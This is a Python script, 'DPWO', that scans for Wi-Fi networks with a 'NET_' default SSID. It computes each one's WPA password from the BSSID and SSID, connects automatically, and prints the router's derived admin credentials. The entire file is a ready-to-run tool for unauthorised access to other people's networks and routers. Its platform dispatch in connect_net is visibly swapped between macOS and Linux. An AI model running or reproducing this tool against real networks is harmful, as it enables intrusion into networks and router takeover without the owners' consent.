import subprocess , argparse , sys
from re import compile
from wifi import Cell, Scheme


'''
DPWO
Default Password Wifi Owner 0.3v
'''

AIRPORT_PATH = "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport"


class NETOwner():
    def __init__(self, iface, regex='^NET_',
                 airport=AIRPORT_PATH, verbosity=0):
        self.iface = iface
        self.regex = compile(regex)
        self.airport = airport
        self.verbosity = verbosity
        self.os = sys.platform

    def osx_networks(self):
        scan = ''
        while scan == '':  # for some reason airport fails randomly
            scan = subprocess.check_output([self.airport, "scan"]).decode()
            # scan the area for wifi

        scan = scan.split("\n")

        for wifi in scan:
            obj = str.split(wifi)

            if len(obj) > 0:
                yield obj

    def linux_networks(self):
        scan = Cell.all(self.iface)
        for wifi in scan:
            obj = [wifi.ssid, wifi.address, wifi.signal, wifi.channel, wifi]
            yield obj

    def scan_network(self):
        if self.os == "linux" or self.os == "linux2":
           scanner = self.linux_networks()
        elif self.os == "darwin":
           scanner = self.osx_networks()
        #elif os == "win32":
            
        results = []
        for wifi in scanner:
            if self.verbosity > 1:
                print(wifi)

            # match NET's default SSID
            if self.regex.search(wifi[0]) is not None:
                print("Found WIFI!")
                # the password consists of CM_MAC last 4 hexas of the router,
                # which are the third hexa of the BSSID
                # plus the last 3 hexas of the SSID

                chunks = [
                    ''.join(wifi[1].upper().split(":")[2:3]),
                    wifi[0].split("_")[1][2:]
                ]

                password = ''.join(chunks)
                results.append([wifi[0], password, wifi[1]])

                if self.os != 'darwin':
                    Scheme.for_cell(
                        self.iface, wifi[1], wifi[4], password
                    ).save()

        return results

    def connect_net(self, wifi):
        if self.os == "linux" or self.os == "linux2":
           status = self.connect_net_osx(wifi)
        elif self.os == "darwin":
           status = self.connect_net_linux(wifi)
        #elif os == "win32":

        return status

    def connect_net_osx(self, wifi):
            connect = subprocess.check_output([
                "networksetup", "-setairportnetwork",
                self.iface, wifi[0], wifi[1]
            ]).decode()

            if self.verbosity > 0:
                print(connect)

            return "Failed" not in connect

    def connect_net_linux(self, wifi):
        return Scheme.find(self.iface, wifi[1]).activate()

    def own(self):
        wifi_available = self.scan_network()

        if len(wifi_available) == 0:
            print("No NET WiFi available :'(")
        else:
            for wifi in wifi_available:
                print("WI-FI: " + wifi[0])
                print("Password: " + wifi[1])
                print("Trying to connect...")
                if self.connect_net(wifi):
                    print("Connected! Have fun (:")
                    if self.verbosity > 0:
                        print("Admin credentials of the router: ")
                        print("User: " + wifi[0])
                        print("Password: NET_" + wifi[1][2:])
                        # the password is the full CM_MAC
                        print("Yeah, I know...")
                    return
                else:
                    print("Nope :(")


def parse_args():
    parser = argparse.ArgumentParser(
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )

    parser.add_argument("-i", "--interface", default="wlp3s0",
                        help="Network interface.")
    parser.add_argument("-r", "--regex", default="^NET_",
                        help="Regular expression to match networks.")
    parser.add_argument("-a", "--airport", default=AIRPORT_PATH,
                        help="Airport program path.")
    parser.add_argument("-v", "--verbosity", action="count",
                        help="Increase output verbosity.")
    args = parser.parse_args()

    return args


def main():
    print("DPWO      v0.3")
    print("≈≈≈≈≈≈≈≈≈≈≈≈≈≈")

    args = parse_args()

    owner = NETOwner(
        args.interface,
        regex=args.regex,
        airport=args.airport,
        verbosity=args.verbosity or 0
    )

    owner.own()


if __name__ == "__main__":
    main()
